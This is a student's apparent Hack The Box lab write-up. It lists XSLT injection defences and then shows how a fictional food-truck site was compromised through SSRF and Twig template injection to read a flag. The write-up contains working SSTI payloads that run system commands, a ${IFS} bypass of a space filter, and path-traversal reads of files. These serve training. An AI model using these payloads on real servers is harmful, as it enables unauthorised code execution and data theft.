### Preventing XSTL Injection

Preventing XSLT injection requires a combination of strict input handling and defensive server-side configuration. Below is a summary of the key strategies for mitigating this vulnerability.

**Secure Input Handling**

- **Avoid Direct Insertion:** The most effective defense is to never insert raw user input directly into XSL data before processing.
- **Validation and Sanitization:** If user-provided data must be included, implement rigorous validation based on the expected format.
- **Output Encoding:** For HTML-based responses, use HTML-encoding (e.g., converting `<` to `&lt;`) to prevent the processor from interpreting user input as active XSLT elements.

**System Hardening and Configuration**

- **Least Privilege:** Run the XSLT processor as a low-privilege user to limit the potential damage if the system is compromised.
- **Disable Dangerous Functions:** Turn off the ability to call external functions or high-risk features (such as PHP functions) within the XSLT environment.
- **Maintenance:** Regularly update XSLT libraries to ensure the latest security patches are applied and known exploits are closed.

## **Skills Assessment**

## Scenario

The food truck company `Flavor Fusion Express` tasked you to perform a security assessment of its newly launched website, created to enhance customer outreach and streamline online ordering. While the site aims to improve user engagement and brand presence, the company is particularly concerned about potential server-side vulnerabilities that could compromise sensitive business data, order information, or administrative functionality. Your task is to evaluate the backend infrastructure, configuration, and server logic for weaknesses that an attacker could exploit. Try to utilize the various techniques you learned in this module to identify and exploit vulnerabilities found in the web application.

### Discovery

upon loading the target website, there was three POST request sent to internal resources

```xml
api=http://truckapi.htb/?id%3DFusionExpress03
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/s1.png)

### Testing For SSRF

Since the target requests internal resources, we will try if its vulnerable to SSRF. First I requested internal resource on port 80 and it returned a response, but when I request for resources on port 8080 it returned this error: 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/s2.png)

So this confirm SSRF vulnerability. when attempting to read local file it retuned this error 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/s3.png)

Directory fuzzing wasnt helpful

```bash
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt  \
  -u "http://94.237.50.128:31839/" \
 -X POST \
 -d "api=http://127.0.0.1:80/FUZZ.php" \
 -fr "Server at 127.0.0.1 Port 80" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -s
index

```

### Testing For SSTI

I first tried  `${{<%%'"}}%\` on the id parameter and result in: 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/s4.png)

To confirm the vulnerability, tested first : 

- {{7*7}} → result 47
- {{7*’7’}} → result 47 which confirm the vulnerability and the template installed is **Twig** (PHP-based, which may cast the string to an integer)

Next I passed this payload `{{_self}}` for information discovery: 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/s5.png)

### RCE

gained RCE using this pyload

```bash
api=http://truckapi.htb/?id={{['id']|filter('system')}}
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/s6.png)

```bash
Error (3): URL using bad/illegal format or missing URL
```

it looks like there is a security  filter on shell commands. For space , these characters were triggerd

```bash
+
%09
%0a
${IFS} -> passed
```

```php
api=http://truckapi.htb/?id={{['cat${IFS}index.php']|filter('system')}}
```

```php
<?php 

require_once 'vendor/autoload.php';
$loader = new \Twig\Loader\FilesystemLoader('./');
$twig = new \Twig\Environment($loader);

if(isset($_GET['id']))
{
  $id = $_GET['id'];

  $location = "134 Main Street";
  if ($id === "FusionExpress01" ) {
    $location = "321 Maple Lane";
  }
  if ($id === "FusionExpress02" ) {
    $location = "456 Oak Avenue";
  }

  $t = '{"id": "'. $_GET['id'] .'", "location": "{{ location }}"}';
  $template = $twig->createTemplate($t);
  echo $template->render(['location' => $location]);
} else {
  echo '{"error": "Please specify a truck ID"}';
}
?>Array", "location": "134 Main Street"}
```

### Obtaining the flag

So only the space was filtered, we can use slash and other characters freely

```php
http://truckapi.htb/?id={{['cat${IFS}../../../flag.txt']|filter('system')}}
```